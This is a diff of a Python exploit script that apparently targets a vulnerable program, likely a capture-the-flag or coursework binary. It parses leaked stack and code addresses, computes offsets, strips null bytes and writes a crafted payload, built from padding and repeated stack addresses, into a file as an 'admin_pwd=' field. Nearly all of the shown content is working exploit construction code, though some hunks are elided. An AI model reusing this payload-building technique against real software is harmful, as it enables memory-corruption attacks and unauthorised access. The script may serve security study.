@@ -1,15 +1,14 @@
 
+# Usage: python3 ./a.out <1 for hardcoded values, 0 for dynamic> <serve_ultimate_offset> <stack_offeset>
+# IMPORTANT: both offsets need to be positive or 0, the script will do the rest
+
 import sys
 
+# hardcoded_values = [ '01b1b200', '56559f10', 'f7ffb000', 'ffffce18', '565569ab' ]
 
 hardcoded = False
-
-# hardcoded_values = [ '01b1b200', '56559f10', 'f7ffb000', 'ffffce18', '565569ab' ]
 hardcoded_values = [ '6d072d00', 'ffffffff', 'ffffffff', 'ffff9588', '565fa015' ]
-
-hardcoded_base_param_arg = 'ffff9588'
-
-# import bytes
+hardcoded_base_param_arg = hardcoded_values[-2]
 
 def substitute_null_bytes(word):
     dangerous = []
@@ -54,7 +53,6 @@ def main():
     # dummy_chars = int(sys.argv[2])
     
     if not hardcoded:
-        input()
         response = input().split()[-6:-1]
         base_param = response[-2]
     else:
@@ -81,7 +79,7 @@ def main():
     print(nw)
 
 
-    base_param_arg = int(base_param, 16) - offset_stack
+    base_param_arg = int(base_param, 16) - offset_stack  # !
 
     param_arg = hex(base_param_arg)[2:]
     print('Stack: ', param_arg)
@@ -98,8 +96,8 @@ def main():
     payload = 2 * b'\xBB' +  12 * hex_param_arg + load
     print(payload)
 
-    with open("payload.bin", "wb") as f:
-        f.write(payload)
+    # with open("payload.bin", "wb") as f:
+        # f.write(payload)
 
     with open("full_payload.bin", "wb") as f:
         f.write( b'admin_pwd=' +  payload )
